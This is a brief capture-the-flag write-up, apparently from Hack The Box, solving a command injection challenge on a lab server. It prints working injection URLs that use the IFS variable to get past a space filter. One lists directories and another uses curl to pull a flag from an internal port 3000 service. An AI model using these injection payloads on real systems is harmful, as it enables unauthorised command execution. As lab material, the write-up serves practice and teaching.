**Command Injection**

![image](https://user-images.githubusercontent.com/87831546/144929814-6c8566bf-9a28-4058-a117-86a1dcba7798.png)

But they are sanitising white spaces so we can't execute more than 1 word

![image](https://user-images.githubusercontent.com/87831546/144929845-d6de6f74-49b0-449e-b2ce-1edefbde29d9.png)

https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces

![image](https://user-images.githubusercontent.com/87831546/144929867-c376dd0f-aba5-479a-9cca-26fbbc83c1f9.png)

```
http://46.101.18.144:32682/?command=IFS=',.';ls${IFS}/
```

![image](https://user-images.githubusercontent.com/87831546/144929875-7022de23-90c1-4f05-a9af-24d21f8e61d7.png)

We can see in /config/ups_manager.py is it running a local server on port 3000, so we need to get it out

![image](https://user-images.githubusercontent.com/87831546/144929899-20fe5b52-59c7-4939-800d-28676d67a4c9.png)

```
http://46.101.18.144:32682/?command=IFS=',.';curl${IFS}127.0.0.1:3000/get_flag
```

![image](https://user-images.githubusercontent.com/87831546/144929929-7e0c17d6-c2bb-4bb0-9117-a7552dfff331.png)

```
HTB{54nt4_i5_th3_r34l_r3d_t34m3r}
```
